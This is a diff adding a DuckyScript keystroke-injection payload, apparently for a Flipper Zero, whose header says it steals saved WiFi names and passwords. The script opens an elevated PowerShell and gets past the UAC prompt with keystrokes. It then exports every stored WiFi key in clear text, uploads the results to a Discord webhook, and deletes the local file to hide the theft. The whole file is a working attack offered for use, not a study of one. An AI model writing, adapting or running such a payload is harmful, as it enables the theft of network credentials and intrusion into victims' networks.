@@ -1,0 +1,16 @@
+REM Author: NocX
+REM Description: Steals saved WiFi SSID and passwords and sends them to a Discord webhook.
+REM Version: 1.2
+REM Category: Passwords
+
+DELAY 500
+GUI r
+DELAY 500
+STRING powershell Start-Process powershell -Verb runAs
+ENTER
+DELAY 800
+LEFTARROW
+ENTER
+DELAY 500
+STRING $userDir = (Get-ChildItem env:\userprofile).value; $wifiPasswords = netsh wlan export profile key=clear folder=$userDir; $wifiFiles = Get-ChildItem "$userDir\*.xml"; $passwordsFile = "$userDir\WiFi_Passwords.txt"; foreach ($file in $wifiFiles) { $wifiData = Get-Content $file.FullName; $ssid = ($wifiData | Select-String '<name>(.*?)</name>').Matches.Groups[1].Value; $password = ($wifiData | Select-String '<keyMaterial>(.*?)</keyMaterial>').Matches.Groups[1].Value; if ($password) { "SSID: $ssid, Password: $password" >> $passwordsFile;} } $webhookUrl = "YOUR_DISCORD_WEBHOOK_TOKEN"; $Body = @{ content = "$env:computername WiFi SSIDs and Passwords from Flipper Zero"}; Invoke-RestMethod -ContentType 'Application/Json' -Uri $webhookUrl -Method Post -Body ($Body | ConvertTo-Json); curl.exe -F "file1=@$passwordsFile" $webhookUrl; Remove-Item $passwordsFile; exit
+ENTER
